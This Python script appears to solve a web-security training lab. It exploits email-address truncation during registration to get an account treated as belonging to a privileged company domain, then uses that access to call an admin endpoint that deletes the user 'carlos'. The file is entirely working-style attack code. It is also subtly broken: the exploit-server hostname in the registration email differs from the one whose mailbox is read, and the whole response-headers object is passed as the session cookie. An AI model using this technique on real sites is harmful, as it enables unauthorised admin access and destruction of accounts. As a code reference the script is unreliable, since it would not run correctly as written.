#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0ae300b9031632b481e6a70200260035.web-security-academy.net'

response = requests.get(url + '/register')

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']
session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

# Post register

cookies = {
    'session': session,
}

data = {
    'csrf': csrf,
    'username': 'a',
    'email': 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@dontwannacry.com.exploit-0a9600890419dc4cc13d35cd019700fc.exploit-server.net',
    'password': 'a',
}

response = requests.post(
    url + '/register',
    cookies=cookies,
    data=data,
    verify=False,
    allow_redirects=False
)

# Get link from email

response = requests.get(
    'https://exploit-0a8e00ac038e32978191a620011b00ed.exploit-server.net/email',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
link = soup.find_all('a')[2]['href']
print(link)

# Get link to confirm register

response = requests.get(
    link,
    cookies=cookies,
    verify=False,
)

response = requests.get(
    url + '/register',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']


data = {
    'csrf': csrf,
    'username': 'a',
    'password': 'a',
}
session = requests.Session()
response = session.post(
    url + '/login',
    data=data,
    cookies=cookies,
    allow_redirects=False,
    verify=False,
    )

session = response.headers
print(session)


cookies = {
    'session': session,
}

response = requests.get(
    url + '/admin/delete?username=carlos',
    cookies=cookies,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
